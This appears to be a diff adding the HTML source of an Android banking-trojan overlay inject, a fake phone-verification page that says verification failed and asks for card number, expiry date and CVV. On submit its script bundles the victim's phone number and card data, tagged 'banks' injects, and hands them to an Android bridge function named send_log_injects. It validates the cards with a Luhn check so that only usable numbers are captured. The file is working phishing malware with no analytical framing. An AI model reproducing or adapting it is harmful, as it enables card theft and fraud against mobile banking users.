@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <style>
+        body {
+            background-color: #fefefe;
+        }
+
+        #form1, #form2 {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header, section {
+            padding: 15px;
+        }
+
+        section {
+            flex: 1;
+
+            border: 0;
+            border-radius: 18px 18px 0 0;
+            box-shadow: 0 -8px 5px #f6f6f6;
+        }
+
+        label {
+            color: #54b889;
+            font-size: 14px;
+            margin: 0;
+        }
+
+        .input {
+            width: 100%;
+            border: 0;
+            border-bottom: 1px solid #e1e1e1;
+            padding: 8px;
+            padding-left: 0;
+            margin-bottom: 15px;
+        }
+
+        .input:focus {
+            border-color: #54b889;
+        }
+
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .button {
+            width: 100%;
+            padding: 14px;
+            font-weight: 500;
+            color: #fff;
+            background-color: #54b889;
+            border: 0;
+        }
+
+        .button:disabled {
+            background-color: #d2d6d8;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+    </style>
+</head>
+<body>
+    <div id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#54b889"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <p style="font-size: 12px;color: #92999e;">
+                    step 1 of 3
+                </p>
+
+                <h5 style="font-weight: 600;">Enter your phone number</h5>
+
+                <p style="font-size: 14px;color: #92999e;">we'll send you a verification code.</p>
+            </header>
+            <section>
+                <label for="number">Phone number</label>
+                <input type="tel" inputmode="numeric" class="input" id="number" name="number" placeholder="" autocomplete="off">
+            </section>
+            <footer>
+                <p style="font-size: 12px;width: 80%;text-align: center;margin: 15px auto;color: #92999e;">By tapping continue, you agree with our <span style="font-size: 14px;color: #480886;">Tems & Conditions</span> and <span style="font-size: 14px;color: #480886;">Privacy Policy</span>.</p>
+
+                <input type="button" class="button" id="nextPage" disabled value="Continue">
+            </footer>
+        </div>
+        <div id="form2" style="display: none;">
+            <header>
+                <p style="font-size: 12px;color: #92999e;">
+                    step 2 of 3
+                </p>
+
+                <h5 style="font-weight: 600;">Enter your Credit card data</h5>
+
+                <p style="font-size: 14px;color: #92999e;">We couldn't verify you, please complete additional verification with your card.</p>
+            </header>
+            <section>
+                <label for="login">Credit Card</label>
+                <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input" placeholder="" autocomplete="off">
+
+                <label for="exp" style="float: left;width: 49%;">Expiration Date</label>
+                <label for="cvv" style="float: right;width: 49%;">CVV</label>
+                <input type="tel" inputmode="numeric" id="exp" name="exp" maxlength="5" style="width: 49%;float: left;" onkeyup="check7();check8()" class="input" placeholder="" autocomplete="off">
+                <input type="password" inputmode="numeric" id="cvv" name="cvv" maxlength="3" style="width: 49%;float: right;" onkeyup="check8()" class="input" placeholder="" autocomplete="off">
+            </section>
+            <footer>
+                <p style="font-size: 12px;width: 80%;text-align: center;margin: 15px auto;color: #92999e;">By tapping continue, you agree with our <span style="font-size: 14px;color: #480886;">Tems & Conditions</span> and <span style="font-size: 14px;color: #480886;">Privacy Policy</span>.</p>
+
+                <input type="submit" class="button" id="sendData" disabled value="Continue">
+            </footer>
+        </div>
+    </form>
+    <script>
+        $('#cc').mask('0000 0000 0000 0000')
+        $('#exp').mask('00/00')
+        $('#cvv').mask('000')
+        $('#number').mask('0000000000')
+
+        var login = document.getElementById('number');
+        
+        var nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+
+        var spinner = document.getElementById('spinner'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2');
+
+        var cc = document.getElementById('cc'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv');
+
+        login.onkeyup = () => {
+            if(login.value.length > 5) {
+                nextPage.disabled = false
+            } else {
+                nextPage.disabled = true
+            }
+        }
+
+        nextPage.onclick = () => {
+            spinner.style.display = 'block';
+
+            setTimeout(() => {
+                spinner.style.display = 'none'
+                form1.style.display = 'none'
+                form2.style.display = 'flex'
+            }, 1500);
+        }
+
+
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        function check8() {
+            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+            data.login = login.value;
+            data.cc = cc.value;
+            data.exp = exp.value;
+            data.cvv = cvv.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+</body>
+</html>
